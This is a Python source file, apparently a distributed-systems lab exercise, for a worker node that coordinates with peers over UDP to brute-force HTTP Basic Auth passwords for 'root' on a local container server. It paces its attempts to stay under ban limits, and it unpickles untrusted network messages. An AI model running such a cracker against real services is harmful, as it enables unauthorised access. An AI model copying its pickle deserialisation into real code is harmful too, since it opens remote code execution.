import string
import time
import h11
import socket
import pickle
import logging
import random
from datetime import datetime
from base64 import b64encode
from http_client import MyHttpClient
from server.const import (
    BANNED_TIME,
    COOLDOWN_TIME,
    NEW_PENALTY,
    MIN_VALIDATE,
    MAX_VALIDATE,
    MIN_TRIES,
    MAX_TRIES,
    PASSWORD_SIZE,
)
logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)
class Slave:
    def __init__(self, my_host):
        self.server_host = "172.17.0.2"
        self.client = MyHttpClient(self.server_host, 8000)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(COOLDOWN_TIME/999.9)
        self.my_address = (my_host, 5000)
        self.done = False
        self.inside_network = False
        
        self.addr_list = {}         #Machines addr
        self.attempts = []           #Wrong attempts
        self.events_recv = []       #Events received from server
        self.chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
        self.pass_len = 1
        self.control = 0
        self.time = 0
        
    def send(self, address, msg):
        """ Send msg to address. """
        payload = pickle.dumps(msg)
        self.sock.sendto(payload, address)

    def recv(self):
        """ Retrieve msg payload and from address."""
        try:
            payload, addr = self.sock.recvfrom(1024)
        except socket.timeout:
            return None, None

        if len(payload) == 0:
            return None, addr
        return payload, addr


    def node_join(self, args):
        """Process JOIN_REQ message."""
        addr = args["addr"]

        #Send the slaves to the new one
        self.send(addr, {"method": "JOIN_REP", "args": {"addr": self.my_address, "attempts": self.attempts}})
        self.addr_list[addr] = datetime.now()


    def check_slave_failure(self):
        """If slave no longer recv msg from another slave (4 sec)"""
        for conn in list(self.addr_list):
            time_delta = datetime.now() - self.addr_list[conn]
            timeout = time_delta.total_seconds()
            if timeout>=4:
                del self.addr_list[conn]
    

    def random_password(self, size):
        random_pass = "".join(random.choice(self.chars) for x in range(size))
        while random_pass in self.attempts:
                random_pass = "".join(random.choice(self.chars) for x in range(size))
        return random_pass


    def send_to_server(self, guess):
        auth = 'Basic ' + b64encode(('root:'+guess).encode('utf-8')).decode('utf-8')
        try:
            d = datetime.now()
            self.client.send(h11.Request(method="GET", target="/", headers=[("Host", self.server_host), ("Authorization", '{}'.format(auth))]))
            self.client.send(h11.EndOfMessage())
            self.events_recv = []
            while True:
                event = self.client.next_event()
                self.events_recv.append(event)
                if type(event) is h11.EndOfMessage:
                    break
            self.client.conn.start_next_cycle()
        
        #Server Failure
        except Exception as msg:        
            logging.error("Error connecting to server! %s", msg)
            self.attempts = []
            self.pass_len = 1
            try:
                self.client = MyHttpClient(self.server_host, 8000)
            except Exception:
                pass
            return

        return self.events_recv[0]


    def send_to_rest(self, msg):
        if self.addr_list:
            for conn in list(self.addr_list):
                self.send(conn, msg)


    def check_pass_len(self):
        if len(self.chars) <= len(self.attempts) < len(self.chars)+(len(self.chars)**2):
            self.pass_len = 2
        if len(self.chars)+(len(self.chars)**2) <= len(self.attempts) < len(self.chars)+(len(self.chars)**2)+(len(self.chars)**3):
            self.pass_len = 3


    def run(self):
        init = datetime.now()
        self.time = init
        self.sock.bind(self.my_address)
        while not self.inside_network:
            join_msg = {
                "method": "JOIN_REQ",
                "args": {"addr": self.my_address},
            }
            # Join request to network
            for i in range(int(self.server_host[-1])+1, int(self.server_host[-1]) + 4):
                addr = (str(self.server_host[:-1])+str(i), 5000)
                if addr != self.my_address:
                    self.send(addr, join_msg)

            payload, addr = self.recv()
            if payload is not None:
                output = pickle.loads(payload)
                logging.debug("O: %s", output)
                if output["method"] == "JOIN_REP":
                    args = output["args"]
                    self.inside_network = True
                    self.addr_list[args["addr"]] = datetime.now()
                    self.attempts+=args["attempts"]
                    self.attempts = list(set(self.attempts))
                    self.check_pass_len()
                    logging.info(self)
            else:
                self.inside_network = True


        while not self.done:
            self.check_slave_failure()
            self.check_pass_len()

            random_pass = self.random_password(self.pass_len)

            logging.debug("Guess to try --: %s", random_pass)
            response = self.send_to_server(random_pass)
            if response:
                if response.status_code == 200:
                    self.done = True
                    logging.debug("Found! Pass -: %s", random_pass)
                    logging.debug("Image -: %s", self.events_recv[1].data )
                    self.send_to_rest({"method": "FOUND","args": {"addr": self.my_address, "data": self.events_recv[1]},})
                    final = datetime.now()
                    time_delta = final - self.time
                    total_minutes = time_delta.total_seconds() / 60
                    logging.info("Time to find --: %s min", total_minutes)
                    break
                else:
                    self.attempts.append(random_pass)
                    self.send_to_rest({"method": "ATTEMPT","args": {"addr": self.my_address, "attempt": random_pass},})

                if self.control%MIN_TRIES == 0:
                    time.sleep(COOLDOWN_TIME/1000)
                self.control+=1

            payload, addr = self.recv()
            if payload is not None:
                output = pickle.loads(payload)
                logging.debug("O: %s", output)
                if output["method"] == "JOIN_REQ":
                    self.node_join(output["args"])
                    logging.info(self)
                if output["method"] == "FOUND":
                    logging.info(self)
                    self.done = True
                if output["method"] == "ATTEMPT":  
                    attempt = output["args"]["attempt"]
                    if attempt not in self.attempts:
                        self.attempts.append(attempt)
                    self.addr_list[output["args"]["addr"]] = datetime.now()
                    logging.info(self)
            
            else:
                logging.info(self)

    
    def __str__(self):
        return "Slave: {}; Network: {}; Attempts: {}; Workers List Size: {}".format(
            self.my_address,
            self.inside_network,
            len(self.attempts),
            len(self.addr_list)+1
        )

    def __repr__(self):
        return self.__str__()

if __name__ == "__main__":
    my_host = socket.gethostbyname(socket.gethostname())
    slave = Slave(my_host)
    slave.run()